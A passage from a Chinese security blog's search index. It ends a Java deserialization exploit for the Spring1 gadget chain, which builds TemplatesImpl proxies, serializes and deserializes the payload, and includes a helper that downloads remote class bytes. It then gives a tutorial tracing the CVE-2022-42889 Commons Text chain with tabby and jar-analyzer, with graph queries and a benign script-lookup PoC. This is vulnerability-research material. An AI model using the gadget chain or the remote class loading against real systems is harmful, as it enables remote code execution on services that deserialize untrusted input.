Templates(TemplatesImpl 父类) 类型的类</span><br>        <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span><br><span class="hljs-comment">//        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="hljs-comment">//                new Class[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br><br>        <span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br>        <span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span><br>        <span class="hljs-comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc7&quot;</span>));<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><span class="hljs-comment">//</span><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc7&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] loadRemoteClass(String remoteClassUrl) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(remoteClassUrl);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> url.openConnection();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>             <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bufferedInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(inputStream);<br>             <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>()) &#123;<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> bytesRead;<br>            <span class="hljs-keyword">while</span> ((bytesRead = bufferedInputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                outputStream.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>            &#125;<br>            <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>su18 NB</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://su18.org/post/ysoserial-su18-3/#spring1">https://su18.org/post/ysoserial-su18-3/#spring1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tabby_jar-analyzer_commons-text</title>
    <link href="/2023/12/13/tabby-jar-analyzer-commons-text/"/>
    <url>/2023/12/13/tabby-jar-analyzer-commons-text/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-工具介绍"><a href="#0x01-工具介绍" class="headerlink" title="0x01 工具介绍"></a>0x01 工具介绍</h2><p>​<a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></p><p>TABBY 是一款针对 Java 语言的静态代码分析工具，相关工作已被接收发表在 The 53rd Annual IEEE&#x2F;IFIP International Conference on Dependable Systems and Networks (DSN 2023)，会议论文录用名单详见<a href="https://dsn2023.dei.uc.pt/program_research.html">DSN2023</a>。</p><p>TABBY使用静态分析框架 <a href="https://github.com/soot-oss/soot">Soot</a> 作为语义提取工具，将JAR&#x2F;WAR&#x2F;CLASS文件转化为代码属性图。 并使用 <a href="https://neo4j.com/">Neo4j</a> 图数据库来存储生成的代码属性图CPG。</p><p>​<a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p><p><code>Jar Analyzer</code> 是一个分析 <code>Jar</code> 文件的 <code>GUI</code> 工具：</p><ul><li>支持大 <code>Jar</code> 以及批量 <code>Jars</code> 分析 </li><li>方便地搜索方法之间的调用关系 </li><li>分析 <code>LDC</code> 指令定位 <code>Jar</code> 中的字符串 </li><li>一键分析 <code>Spring Controller/Mapping</code> </li><li>对于方法字节码和指令的高级分析 </li><li>一键反编译，优化对内部类的处理 </li><li>一键生成方法的 <code>CFG</code> 分析结果 </li><li>一键生成方法的 <code>Stack Frame</code> 分析结果 </li><li>自定义 <code>SQL</code> 语句进行高级分析</li></ul><h2 id="0x02-漏洞环境Apache-Commons-Text"><a href="#0x02-漏洞环境Apache-Commons-Text" class="headerlink" title="0x02  漏洞环境Apache Commons Text"></a>0x02  漏洞环境Apache Commons Text</h2><p>CVE-2022-42889 Apache Commons Text 1.5 &lt;&#x3D; Apache Commons Text &lt;&#x3D; 1.9</p><p>org.apache.commons.text.lookup.StringLookup 的实例。从 1.5 版到 1.9 版，攻击者可构造恶意文本，使得Apache Commons Text 在解析时执行任意恶意代码。</p><p><a href="https://repo1.maven.org/maven2/org/apache/commons/commons-text/1.9/commons-text-1.9.jar">Apache Commons Text 1.9</a></p><h2 id="0x03-使用jar-ayalyzer分析"><a href="#0x03-使用jar-ayalyzer分析" class="headerlink" title="0x03  使用jar-ayalyzer分析"></a>0x03  使用jar-ayalyzer分析</h2><p><img src="1701542509837-9a932a3a-ed26-435c-8408-8fe6fbcc894c-20231213233843707.png" alt="img"></p><p>导入后点击start engine。</p><p>我们知道CVE-2022-42889主要触发点是lookup调用了ScriptEngine的eval方法造成代码执行。</p><p><img src="1701542516105-69a93177-dab0-416c-a9d3-902fd7de7f50-20231213233844022.png" alt="img"></p><p>在search类别里进行搜索</p><p><img src="1701542521312-680b91da-fa02-47e5-ac1b-ab70b26d2068-20231213233843832.png" alt="img"></p><p>这里可以得到org.apache.commons.text.lookup$lookup方法调用了scriptEngine.eval。然后key可控， script &#x3D; keys[1]，所以慢慢往上走就可以了。</p><p><img src="1701542531309-72c89775-84ca-457d-b133-ea5d0682434b-20231213233845038.png" alt="img"></p><p>在call界面，有caller，callee两个界面。caller表示哪个方法调用了lookup方法，callee表示lookup里调用了什么方法。</p><p><img src="1701542537645-b7dacbd6-0c0d-4f7c-966b-54f7f9dcd6f9-20231213233844376.png" alt="img"></p><p>往上来到了StringLookup接口，上面是调用，下面是实现类。</p><p><img src="1701542541197-20f9c12a-7104-4515-8f69-ff576fd6e1b2-20231213233844930.png" alt="img"></p><p>也可以在impl里面查看接口的实现类。</p><p><img src="1701542545932-beb52cde-85a3-4435-a9ec-92e08bfcc52d-20231213233843996.png" alt="img"></p><p>往上来到了org.apache.commons.text$StringSubstitutor#resolveVariable, 可以看到都可传。</p><p><img src="1701542550368-ec85dbbf-d12e-4022-b707-60eb5a78d099-20231213233844246.png" alt="img"></p><p><img src="1701542554978-536ddcbc-61c3-4db4-9dab-e8aa12e2a0e3-20231213233844229.png" alt="img"></p><p>org&#x2F;apache&#x2F;commons&#x2F;text&#x2F;StringSubstitutor#substitute，之间如果有别的调用，慢慢分析也就有很多其他的触发链，但这个好像并没有</p><p><img src="1701542558672-b87f43ef-b90e-4590-abca-31e0b0ef0b3b-20231213233844510.png" alt="img"></p><p>最后可以看见replace调用。</p><p><img src="1701542563767-4a0c7bd6-1292-4354-9f29-8f515fc89f5d-20231213233844477.png" alt="img"></p><p>都是差不多的处理。</p><p>Poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StringSubstitutor</span> <span class="hljs-variable">stringSubstitutor</span> <span class="hljs-operator">=</span> StringSubstitutor.createInterpolator();<br>stringSubstitutor.replace(<span class="hljs-string">&quot;$&#123;script:javascript:2 + 2&#125;);</span><br></code></pre></td></tr></table></figure><p>整个使用流程下载感觉非常流畅，无脑。许少在ct一年成长的太快，弟弟我就是纯纯脚本小子。</p><p><img src="1701542570434-0b4fb78c-8694-45cd-99c9-35d8434c06c0-20231213233844636.png" alt="img"></p><p>advance里面有设置好漏洞字符，下面还引入gpt还有一个常用工具。哎，人与人差距太大了，要想上个月投ct安抚，简历都没过，真实服了。</p><h2 id="0x04-tabby"><a href="#0x04-tabby" class="headerlink" title="0x04 tabby"></a>0x04 tabby</h2><p>上面已经知道是起点replace。 终点为lookup。</p><p>那只需要一下语句分析得到调用图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542575487-1e835b7e-096e-4015-9b06-fbdb496eec30-20231213233845116.png" alt="img"></p><p>可以看到已经跑出链子。</p><p><img src="1701542579160-c482b5f4-67d3-4492-8530-499b98b739ec-20231213233844768.png" alt="img"></p><p><img src="1701542583735-a0aea128-c837-4bc9-b19f-2f60152eaf5e-20231213233844867.png" alt="img"></p><p>它是一个接口，实现类太多了，继续添加一点规则。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542590366-eed0ec3a-3916-41d7-a28c-3b517ade4090-20231213233845074.png" alt="img"></p><p>可以得到以上图，org.apache.commons.text.lookup.StringLookup是一个接口，其他的lookup方法都是去实现这个方法。所以这里用:ALIAS去修饰。最后我们走到的eval，所以还有写一条&#x2F;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m3:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;eval&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542597132-35cd9765-ccff-4eae-a67b-92bbbfcd1e3c-20231213233845181.png" alt="img"></p><p>可以看到完整的链子已经出来了。说实话，跑的挺久的，可能我电脑太老了。</p><p>优化一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">MATCH</span> path<span class="hljs-operator">=</span>(source:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;replace&quot;, CLASSNAME: &quot;org.apache.commons.text.StringSubstitutor&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span><span class="hljs-number">0.</span><span class="hljs-number">.1</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span><br>(m1:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;substitute&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m2:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:ALIAS<span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m3:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;lookup&quot;&#125;)<span class="hljs-operator">-</span>[:<span class="hljs-keyword">CALL</span><span class="hljs-operator">*</span>]<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>(m4:<span class="hljs-keyword">Method</span> &#123;NAME: &quot;eval&quot;, CLASSNAME: &quot;javax.script.ScriptEngine&quot;&#125;) <span class="hljs-keyword">RETURN</span> path<br></code></pre></td></tr></table></figure><p><img src="1701542602613-79da88b3-c059-441d-bf99-b59f0bfaf660-20231213233845314.png" alt="img"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>jar-ayalyzer 分析单jar包比较好使，快是真的快，分析起来很流畅，多jar包还是用tabby。tabby使用起来，图形化很直观，就是跑sql语句太慢了（可能我电脑卡），可以分析多jar包，还有neo4j语句太难写了。（小孩才做选择，成人的世界就是全都要）</p><p>整体看来都很不错。只要source点，sink点就能一步步往上挖，这个时候，还是tabby比较好使，全跑出来，然后内眼看。</p><p>tabby内有许多定义好的sink点，很实用。</p><p><img src="1701542607981-a02aeb0e-0ff8-4651-b078-e463fd405ded-20231213233845517.png" alt="img"></p><p><img src="1701542612742-d3540034-16af-4c3a-af66-440aefcf3867-20231213233845511.png" alt="img"></p><p>这里没找到，应该是默认confg里面没有，所以没找到，所以有时候碰见了，可以写进去 ![image-<img src="t1701542618145-15a19937-f46f-41f7-85b0-57e5852bf347-20231213233845351.png" alt="img"></p><p><img src="1701542623492-1d3ae1a1-7d5c-4be1-88b8-97f733967e92-20231213233845516.png" alt="img"></p><p>自己写入sink点，可以成功查询到。</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">MATCH (source:Method &#123;NAME:<span class="hljs-string">&quot;replace&quot;</span>&#125;)<br>MATCH (sink:Method &#123;NAME:<span class="hljs-string">&quot;lookup&quot;</span>&#125;)&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]<br>                    -&gt;(cls1:Class &#123;NAME:<span class="hljs-string">&quot;org.apache.commons.text.lookup.StringLookup&quot;</span>&#125;)<br>MATCH (sink)-[:CALL*]-&gt;(m1:Method&#123;NAME:<span class="hljs-string">&quot;getByName&quot;</span>&#125;)<br>call tabby.beta.findPath(source,<span class="hljs-string">&quot;-&quot;</span>,sink,<span class="hljs-number">12</span>,<span class="hljs-literal">false</span>) YIELD path<br><span class="hljs-keyword">return</span> path<br></code></pre></td></tr></table></figure><p><img src="1701837000942-be1188d1-312e-4f4c-a196-ee15b1e274a0-20231213233845260.png" alt="img"></p><p>dns链</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06  参考链接"></a>0x06  参考链接</h2><p><a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></p><p><a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p><p><a href="https://www.anquanke.com/post/id/283625">https://www.anquanke.com/post/id/283625</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
